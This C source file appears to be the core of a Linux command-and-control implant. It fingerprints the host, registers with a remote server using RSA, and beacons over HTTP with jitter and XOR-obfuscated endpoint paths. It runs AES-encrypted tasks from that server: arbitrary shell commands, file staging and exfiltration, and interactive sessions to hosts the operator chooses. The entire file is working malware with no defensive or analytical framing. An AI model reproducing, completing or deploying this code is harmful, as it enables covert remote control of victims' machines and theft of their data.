#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pwd.h>
#include <sys/utsname.h>
#include <pthread.h>
#include "config.h"
#include "protocol.h"
#include "beacon.h"
#include "protocol/crypto.h"
#include "comms/http.h"
#include "comms/session.h"
#include "comms/socks.h"
#include "exec/exec.h"
#include "exec/builtin.h"
#include "transfer/transfer.h"
#include "util/obf.h"
#include "obf_strings.h"

static uint8_t g_session_key[32];
static uint32_t g_beacon_id;
static uint32_t g_sleep_sec;
static uint32_t g_jitter_pct;
static volatile int g_session_active = 0;

static void collect_sysinfo(implant_metadata_t *meta) {
    char hostname[256] = {0};
    gethostname(hostname, sizeof(hostname) - 1);
    strncpy(meta->hostname, hostname, sizeof(meta->hostname) - 1);

    struct passwd *pw = getpwuid(getuid());
    if (pw && pw->pw_name)
        strncpy(meta->username, pw->pw_name, sizeof(meta->username) - 1);

    char exe[256] = {0};
    ssize_t len = readlink("/proc/self/exe", exe, sizeof(exe) - 1);
    if (len > 0) {
        exe[len] = '\0';
        strncpy(meta->process_name, exe, sizeof(meta->process_name) - 1);
    }

    meta->process_id = (uint32_t)getpid();

#if defined(__x86_64__)
    meta->arch = ARCH_X64;
#elif defined(__aarch64__)
    meta->arch = ARCH_ARM64;
#elif defined(__i386__)
    meta->arch = ARCH_X86;
#elif defined(__arm__)
    meta->arch = ARCH_ARM;
#else
    meta->arch = ARCH_X64;
#endif

    meta->platform = PLATFORM_LINUX;
    meta->integrity = (geteuid() == 0) ? INTEGRITY_SYSTEM : INTEGRITY_MEDIUM;
}

static int do_register(const char *pubkey_pem, const implant_metadata_t *meta) {
    uint8_t plain[1024];
    int plain_len;
    encode_metadata(meta, plain, &plain_len);

    uint8_t encrypted[256];
    size_t enc_len = sizeof(encrypted);
    if (rsa_encrypt_pubkey(pubkey_pem, plain, (size_t)plain_len,
                           encrypted, &enc_len) != 0)
        return -1;

    char path[64];
    xor_dec(path, ENC_PATH_REGISTER, ENC_PATH_REGISTER_LEN);

    uint8_t resp[64];
    int ret = http_request("POST", path, encrypted, enc_len, resp, sizeof(resp));
    return (ret >= 0) ? 0 : -1;
}

static int do_full_register(implant_metadata_t *meta) {
    char path_pub[64];
    xor_dec(path_pub, ENC_PATH_PUBKEY, ENC_PATH_PUBKEY_LEN);

    char method_get[8];
    xor_dec(method_get, ENC_HTTP_GET, ENC_HTTP_GET_LEN);

    char pubkey_pem[2048];
    int pem_len = http_request(method_get, path_pub, NULL, 0,
                               (uint8_t *)pubkey_pem, sizeof(pubkey_pem) - 1);
    if (pem_len <= 0) return -1;
    pubkey_pem[pem_len] = '\0';

    return do_register(pubkey_pem, meta);
}

static void send_task_result(uint32_t beacon_id, const uint8_t *session_key,
                             const task_header_t *req_hdr,
                             const char *output, size_t output_len,
                             uint16_t flags) {
    size_t rep_size = 4 + output_len;
    size_t plain_len = TASK_HEADER_SIZE + rep_size;
    uint8_t *plain = malloc(plain_len);
    if (!plain) return;

    task_header_t resp_hdr = {0};
    resp_hdr.type = req_hdr->type;
    resp_hdr.code = req_hdr->code;
    resp_hdr.flags = flags;
    resp_hdr.label = req_hdr->label;
    resp_hdr.identifier = req_hdr->identifier;
    resp_hdr.length = (uint32_t)rep_size;

    encode_header(&resp_hdr, plain);
    int rep_len;
    encode_run_rep(output ? output : "", plain + TASK_HEADER_SIZE, &rep_len);

    size_t enc_max = plain_len + 48 + 16;
    uint8_t *encrypted = malloc(enc_max);
    if (!encrypted) { free(plain); return; }

    size_t enc_len;
    if (aes_encrypt(session_key, plain, plain_len, encrypted, &enc_len) != 0) {
        free(plain); free(encrypted); return;
    }
    free(plain);

    size_t body_len = 4 + enc_len;
    uint8_t *body = malloc(body_len);
    if (!body) { free(encrypted); return; }

    body[0] = (uint8_t)(beacon_id & 0xFF);
    body[1] = (uint8_t)((beacon_id >> 8) & 0xFF);
    body[2] = (uint8_t)((beacon_id >> 16) & 0xFF);
    body[3] = (uint8_t)((beacon_id >> 24) & 0xFF);
    memcpy(body + 4, encrypted, enc_len);
    free(encrypted);

    char path[64];
    xor_dec(path, ENC_PATH_RESULT, ENC_PATH_RESULT_LEN);

    uint8_t resp[64];
    http_request("POST", path, body, body_len, resp, sizeof(resp));
    free(body);
}

static void handle_run(const task_header_t *hdr, const uint8_t *data) {
    char cmd[4096];
    decode_run_req(data, (int)hdr->length, cmd, sizeof(cmd));

    char *builtin_out = malloc(MAX_CMD_OUTPUT);
    if (!builtin_out) return;
    builtin_out[0] = '\0';

    if (builtin_dispatch(cmd, builtin_out, MAX_CMD_OUTPUT)) {
        size_t out_len = strlen(builtin_out);
        send_task_result(g_beacon_id, g_session_key, hdr,
                         builtin_out, out_len, FLAG_NONE);
        free(builtin_out);
    } else if (strncmp(cmd, "shell ", 6) == 0) {
        free(builtin_out);
        /* "shell <cmd>" prefix -> /bin/sh -c */
        size_t out_len = 0;
        char *output = exec_command_shell(cmd + 6, &out_len);
        send_task_result(g_beacon_id, g_session_key, hdr,
                         output, out_len, FLAG_NONE);
        free(output);
    } else {
        free(builtin_out);
        size_t out_len = 0;
        char *output = exec_command(cmd, &out_len);
        send_task_result(g_beacon_id, g_session_key, hdr,
                         output, out_len, FLAG_NONE);
        free(output);
    }
}

static void handle_set(const task_header_t *hdr, const uint8_t *data) {
    if (hdr->length < 8) return;
    uint32_t interval = (uint32_t)data[0] | ((uint32_t)data[1] << 8)
                      | ((uint32_t)data[2] << 16) | ((uint32_t)data[3] << 24);
    uint32_t jitter   = (uint32_t)data[4] | ((uint32_t)data[5] << 8)
                      | ((uint32_t)data[6] << 16) | ((uint32_t)data[7] << 24);
    g_sleep_sec = interval;
    g_jitter_pct = jitter;

    send_task_result(g_beacon_id, g_session_key, hdr,
                     "sleep updated", 13, FLAG_NONE);
}

static void handle_unsupported(const task_header_t *hdr) {
    char msg[64];
    snprintf(msg, sizeof(msg), "task type %d not supported on Linux", hdr->type);
    send_task_result(g_beacon_id, g_session_key, hdr,
                     msg, strlen(msg), FLAG_ERROR);
}

typedef struct {
    int       sock;
    uint8_t  *session_key;
    uint32_t  beacon_id;
    uint32_t *sleep_sec;
    uint32_t *jitter_pct;
} session_ctx_t;

static void *session_thread_fn(void *arg) {
    session_ctx_t *ctx = (session_ctx_t *)arg;
    session_loop(ctx->sock, ctx->session_key, ctx->beacon_id,
                 ctx->sleep_sec, ctx->jitter_pct);
    __atomic_store_n(&g_session_active, 0, __ATOMIC_RELEASE);
    free(ctx);
    return NULL;
}

static void dispatch_tasks(const uint8_t *data, size_t data_len) {
    size_t offset = 0;
    while (offset + TASK_HEADER_SIZE <= data_len) {
        task_header_t hdr;
        decode_header(data + offset, &hdr);
        offset += TASK_HEADER_SIZE;

        if (hdr.type == TASK_NOP) break;

        const uint8_t *task_data = data + offset;
        if (offset + hdr.length > data_len) break;
        offset += hdr.length;

        switch (hdr.type) {
        case TASK_EXIT:
            send_task_result(g_beacon_id, g_session_key, &hdr,
                             "exiting", 7, FLAG_NONE);
            crypto_free();
            http_cleanup();
            exit(0);
            break;
        case TASK_SET:
            handle_set(&hdr, task_data);
            break;
        case TASK_RUN:
            handle_run(&hdr, task_data);
            break;
        case TASK_FILE_STAGE:
            handle_file_stage(g_beacon_id, hdr.label, hdr.identifier,
                              hdr.flags, task_data, hdr.length,
                              g_session_key, -1);
            break;
        case TASK_FILE_EXFIL:
            handle_file_exfil(g_beacon_id, hdr.label,
                              (const char *)task_data,
                              g_session_key, -1);
            break;
        case TASK_INTERACTIVE:
            if (!__atomic_load_n(&g_session_active, __ATOMIC_ACQUIRE) && task_data) {
                char host[256] = {0};
                uint16_t sport = 0;
                if (parse_interactive_req(task_data, (int)hdr.length,
                                          host, sizeof(host), &sport) == 0) {
                    int s = session_connect(host, sport);
                    if (s >= 0) {
                        session_ctx_t *sc = malloc(sizeof(session_ctx_t));
                        if (sc) {
                            sc->sock        = s;
                            sc->session_key = g_session_key;
                            sc->beacon_id   = g_beacon_id;
                            sc->sleep_sec   = &g_sleep_sec;
                            sc->jitter_pct  = &g_jitter_pct;
                            __atomic_store_n(&g_session_active, 1, __ATOMIC_RELEASE);
                            pthread_attr_t attr;
                            pthread_attr_init(&attr);
                            pthread_attr_setstacksize(&attr, 2 * 1024 * 1024);
                            pthread_t tid;
                            if (pthread_create(&tid, &attr, session_thread_fn, sc) == 0) {
                                pthread_detach(tid);
                                pthread_attr_destroy(&attr);
                            } else {
                                pthread_attr_destroy(&attr);
                                __atomic_store_n(&g_session_active, 0, __ATOMIC_RELEASE);
                                close(s);
                                free(sc);
                            }
                        } else {
                            close(s);
                        }
                    }
                }
            }
            break;
        case TASK_SOCKS_START:
        case TASK_SOCKS_STOP:
            handle_unsupported(&hdr);
            break;
        default:
            handle_unsupported(&hdr);
            break;
        }
    }
}

static void do_sleep(void) {
    uint32_t base_ms = g_sleep_sec * 1000;
    uint32_t jitter_ms = 0;
    if (g_jitter_pct > 0 && base_ms > 0) {
        uint32_t max_jitter = base_ms * g_jitter_pct / 100;
        if (max_jitter > 0) {
            uint32_t rnd;
            crypto_random((uint8_t *)&rnd, sizeof(rnd));
            jitter_ms = rnd % (max_jitter + 1);
        }
    }
    uint32_t total_ms = base_ms + jitter_ms;
    struct timespec ts = {
        .tv_sec  = total_ms / 1000,
        .tv_nsec = (total_ms % 1000) * 1000000L
    };
    nanosleep(&ts, NULL);
}

int main(int argc, char *argv[]) {
    (void)argc; (void)argv;

    if (crypto_init() != 0) return 1;
    if (http_init() != 0) { crypto_free(); return 1; }

    crypto_random(g_session_key, 32);
    crypto_random((uint8_t *)&g_beacon_id, 4);
    if (g_beacon_id == 0) g_beacon_id = 0xDEAD1234;

    g_sleep_sec = SLEEP_MS / 1000;
    g_jitter_pct = JITTER_PCT;

    implant_metadata_t meta = {0};
    meta.id = g_beacon_id;
    memcpy(meta.session_key, g_session_key, 32);
    meta.sleep = g_sleep_sec;
    meta.jitter = g_jitter_pct;
    collect_sysinfo(&meta);

    int registered = 0;
    for (int i = 0; i < REG_RETRIES; i++) {
        if (do_full_register(&meta) == 0) { registered = 1; break; }
        sleep(REG_RETRY_SEC);
    }
    if (!registered) {
        crypto_free();
        http_cleanup();
        return 1;
    }

    char path_checkin[64];
    xor_dec(path_checkin, ENC_PATH_CHECKIN, ENC_PATH_CHECKIN_LEN);

    for (;;) {
        uint8_t checkin_body[4];
        checkin_body[0] = (uint8_t)(g_beacon_id & 0xFF);
        checkin_body[1] = (uint8_t)((g_beacon_id >> 8) & 0xFF);
        checkin_body[2] = (uint8_t)((g_beacon_id >> 16) & 0xFF);
        checkin_body[3] = (uint8_t)((g_beacon_id >> 24) & 0xFF);

        uint8_t *resp = malloc(MAX_RESP_SIZE);
        if (!resp) { do_sleep(); continue; }

        int resp_len = http_request("POST", path_checkin,
                                    checkin_body, 4, resp, MAX_RESP_SIZE);

        if (resp_len > 48) {
            uint8_t *decrypted = malloc((size_t)resp_len);
            if (decrypted) {
                size_t dec_len;
                if (aes_decrypt(g_session_key, resp, (size_t)resp_len,
                                decrypted, &dec_len) == 0) {
                    dispatch_tasks(decrypted, dec_len);
                }
                free(decrypted);
            }
        }

        free(resp);
        do_sleep();
    }
}
